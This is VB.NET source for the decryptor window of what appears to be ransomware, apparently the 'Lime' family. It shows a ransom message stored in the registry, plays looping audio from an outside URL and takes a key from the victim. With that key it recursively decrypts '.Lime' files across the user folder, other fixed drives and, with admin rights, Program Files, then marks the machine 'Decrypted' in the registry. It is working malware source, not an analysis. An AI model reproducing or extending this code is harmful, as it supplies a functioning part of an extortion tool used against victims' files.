Imports System.ComponentModel
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports WMPLib

Public Class Form1

    Public P1 As String
    Private Finished As Integer = 0
    Private FileCount As Integer = 0
    Private userName As String = Environment.UserName
    Private LocalDisk = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3)
    Private OK As Boolean = False

    Private Sub btnDecrypt_Click(sender As Object, e As EventArgs) Handles btnDecrypt.Click
        Try
            If txtKey.Text = "" OrElse txtKey.Text = "KEY" Then
                MsgBox("You Need a KEY", MsgBoxStyle.Critical)
            Else
                txtFiles.Text = String.Empty
                P1 = txtKey.Text
                btnDecrypt.Text = "Please Wait..."
                btnDecrypt.Enabled = False
                txtKey.ReadOnly = True
                Dim D1 As Threading.Thread = New Threading.Thread(AddressOf Dec)
                D1.Start()
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            txtFiles.Text = "..."
            txtMSG.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + C_ID.HWID, "Rans-MSG", Nothing)
            BackgroundWorker4.RunWorkerAsync()
        Catch ex As Exception
        End Try
    End Sub

    Public Sub Dec()
        Try
            BackgroundWorker1.WorkerSupportsCancellation = True
            BackgroundWorker1.RunWorkerAsync()

            BackgroundWorker2.WorkerSupportsCancellation = True
            BackgroundWorker2.RunWorkerAsync()

            BackgroundWorker3.WorkerSupportsCancellation = True
            BackgroundWorker3.RunWorkerAsync()

            Do Until Finished = 3
                Threading.Thread.Sleep(50)
            Loop

            If OK Then
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + C_ID.HWID, "Rans-Status", "Decrypted")
                MsgBox("Done!", MsgBoxStyle.SystemModal)

            End If

            Finished = 0
            P1 = String.Empty

            btnDecrypt.Enabled = True
            btnDecrypt.Text = "Decrypt"
            txtKey.ReadOnly = False

        Catch ex As Exception
        End Try


    End Sub

    Public Function AES_Dec(ByVal B2Dec As Byte(), ByVal KeyBytes As Byte()) As Byte()
        On Error Resume Next
        Dim DecBytes As Byte() = Nothing
        Dim saltBytes As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Using ms As IO.MemoryStream = New MemoryStream()
            Using AES As RijndaelManaged = New RijndaelManaged()
                AES.KeySize = 256
                AES.BlockSize = 128
                Dim key = New Rfc2898DeriveBytes(KeyBytes, saltBytes, 1000)
                AES.Key = key.GetBytes(AES.KeySize / 8)
                AES.IV = key.GetBytes(AES.BlockSize / 8)
                AES.Mode = CipherMode.CBC
                Using cs = New CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write)
                    cs.Write(B2Dec, 0, B2Dec.Length)
                    cs.Close()
                End Using
                DecBytes = ms.ToArray()
            End Using
        End Using
        Return DecBytes
    End Function

    Public Sub File_Dec(ByVal file As String, ByVal key As String)
        Try
            Dim B2Dec As Byte() = IO.File.ReadAllBytes(file)
            Dim KeyBytes As Byte() = System.Text.Encoding.UTF8.GetBytes(key)
            KeyBytes = SHA256.Create().ComputeHash(KeyBytes)
            Dim BytesDec As Byte() = AES_Dec(B2Dec, KeyBytes)
            IO.File.WriteAllBytes(file, BytesDec)
            Dim exten As String = System.IO.Path.GetExtension(file)
            Dim result As String = file.Substring(0, file.Length - exten.Length)
            IO.File.Move(file, result)
            FileCount += 1
            OK = True
            txtFiles.AppendText("[" + FileCount.ToString + "] " + Path.GetFileName(file))
            txtFiles.AppendText(Environment.NewLine)
        Catch ex As Exception
            txtFiles.AppendText("[Wrong Key]")
            txtFiles.AppendText(Environment.NewLine)
            Exit Sub
        End Try
    End Sub

    Public Sub Dir_Dec(ByVal ThePath As String, ByVal key As String)
        Try
            Dim files As String() = Directory.GetFiles(ThePath)
            Dim SubDirectories As String() = Directory.GetDirectories(ThePath)
            For i As Integer = 0 To files.Length - 1
                Dim exten As String = Path.GetExtension(files(i))
                If exten = ".Lime" Then
                    File_Dec(files(i), key)
                End If
            Next
            For i As Integer = 0 To SubDirectories.Length - 1
                Dir_Dec(SubDirectories(i), key)
            Next
        Catch ex As Exception
        End Try
    End Sub

    Public Function AmiAdmin()
        Try
            Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
            Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
            If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
                Return True
            Else
                Return False
            End If
        Catch ex As Exception
            Return False
        End Try
    End Function


    Private Sub txtFiles_TextChanged(sender As Object, e As EventArgs) Handles txtFiles.TextChanged
        On Error Resume Next
        txtFiles.Text.Trim()
        txtFiles.Focus()
        txtFiles.ScrollToCaret()
    End Sub

    Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        End
    End Sub


    Private Sub BackgroundWorker1_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        On Error Resume Next
        Dir_Dec(LocalDisk & "Users\" & userName & "\", P1)
        Finished += 1
    End Sub


    Private Sub BackgroundWorker2_DoWork(sender As Object, e As DoWorkEventArgs) Handles BackgroundWorker2.DoWork
        On Error Resume Next
        For Each drive In Environment.GetLogicalDrives
            Dim Driver As DriveInfo = New DriveInfo(drive)
            If Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(LocalDisk) Then
                Dim DriverPath As String = drive
                Dir_Dec(DriverPath, P1)
            End If
        Next
        Finished += 1
    End Sub

    Private Sub BackgroundWorker3_DoWork(sender As Object, e As DoWorkEventArgs) Handles BackgroundWorker3.DoWork
        On Error Resume Next
        If AmiAdmin() = True Then
            Dir_Dec(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", P1)
        End If
        Finished += 1
    End Sub

    Dim WithEvents Player As New WMPLib.WindowsMediaPlayer
    Private Sub BackgroundWorker4_DoWork(sender As Object, e As DoWorkEventArgs) Handles BackgroundWorker4.DoWork
        Try
            Player.settings.setMode("Loop", True)
            Player.URL = "https://instaud.io/_/2vrB.mp3"
        Catch ex As Exception
        End Try
    End Sub

End Class